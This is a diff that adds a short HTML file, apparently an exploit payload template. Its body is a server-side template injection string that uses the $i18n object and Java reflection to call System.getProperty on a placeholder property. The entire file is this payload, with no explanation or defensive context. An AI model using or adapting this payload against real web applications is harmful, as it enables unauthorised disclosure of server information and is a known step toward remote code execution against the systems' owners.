@@ -1,0 +1,6 @@
+<html>
+<body>
+$i18n.getClass().forName('java.lang.System').getMethod('getProperty', $i18n.getClass().forName('java.lang.String')).invoke(null, '#{prop}').toString()
+
+</body>
+</html>
